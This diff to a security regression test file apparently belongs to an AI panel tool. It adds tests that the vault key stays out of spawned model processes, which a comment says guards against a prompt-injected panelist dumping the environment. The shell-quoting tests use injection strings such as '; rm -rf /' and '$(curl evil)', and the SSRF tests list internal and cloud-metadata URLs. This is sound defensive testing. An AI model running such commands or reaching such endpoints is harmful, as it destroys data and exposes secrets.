@@ -1,6 +1,7 @@
 import { describe, expect, test } from "bun:test";
 import { scrubbedEnv } from "./cli-bridge.ts";
 import { parseVerdict } from "./verdict-parser.ts";
+import { shellQuote, isUnsafeRemoteUrl } from "./runners.ts";
 
 // Regression coverage for the security audit findings. Each test pins one
 // specific attack vector — if any of these stops being blocked, a real
@@ -18,6 +19,19 @@ describe("scrubbedEnv — secret env vars stripped from subprocess spawn", () =>
     } finally {
       if (before === undefined) delete process.env.PREVAIL_TELEGRAM_TOKEN;
       else process.env.PREVAIL_TELEGRAM_TOKEN = before;
+    }
+  });
+
+  test("vault DEK (PREVAIL_VAULT_KEY) is NEVER passed to a spawned model child", () => {
+    // Inverted contract (audit O106/B1): a prompt-injected panelist must not be
+    // able to `env`-dump the vault key and decrypt the whole vault.
+    const before = process.env.PREVAIL_VAULT_KEY;
+    process.env.PREVAIL_VAULT_KEY = Buffer.alloc(32, 7).toString("base64");
+    try {
+      expect(scrubbedEnv().PREVAIL_VAULT_KEY).toBeUndefined();
+    } finally {
+      if (before === undefined) delete process.env.PREVAIL_VAULT_KEY;
+      else process.env.PREVAIL_VAULT_KEY = before;
     }
   });
 
@@ -47,6 +61,40 @@ describe("scrubbedEnv — secret env vars stripped from subprocess spawn", () =>
     } finally {
       if (saved === undefined) delete process.env.MY_APP_SECRET;
       else process.env.MY_APP_SECRET = saved;
+    }
+  });
+});
+
+describe("shellQuote — cli runner cannot be shell-injected (B2/O4)", () => {
+  test("metacharacters are neutralized as a single literal token", () => {
+    for (const evil of ["; rm -rf /", "$(whoami)", "`id`", "a && b", "x | y", "$(curl evil)", "a\nb"]) {
+      const q = shellQuote(evil);
+      // wrapped in single quotes; no bare metacharacter can escape the quotes
+      expect(q.startsWith("'")).toBe(true);
+      expect(q.endsWith("'")).toBe(true);
+      // the only way out of single quotes is a real ' — and those are escaped
+      expect(q.slice(1, -1).includes("'\\''") || !evil.includes("'")).toBe(true);
+    }
+  });
+  test("embedded single quote is escaped, not a breakout", () => {
+    expect(shellQuote("a'b")).toBe("'a'\\''b'");
+  });
+});
+
+describe("isUnsafeRemoteUrl — SSRF guard (B8/O8/O9)", () => {
+  test("blocks loopback/private/link-local/CGNAT/unspecified", () => {
+    for (const u of [
+      "https://localhost/x", "https://127.0.0.1/", "https://10.0.0.5/", "https://192.168.1.1/",
+      "https://169.254.169.254/latest/meta-data", "https://172.16.0.1/", "https://100.64.0.1/",
+      "https://0.0.0.0/", "https://[::1]/", "https://[fc00::1]/", "https://[fe80::1]/",
+      "https://2130706433/", "https://0x7f000001/", "http://example.com/",
+    ]) {
+      expect(isUnsafeRemoteUrl(u)).toBe(true);
+    }
+  });
+  test("allows legitimate public https hosts", () => {
+    for (const u of ["https://api.github.com/repos", "https://mcp.example.com/rpc", "https://generativelanguage.googleapis.com/v1"]) {
+      expect(isUnsafeRemoteUrl(u)).toBe(false);
     }
   });
 });
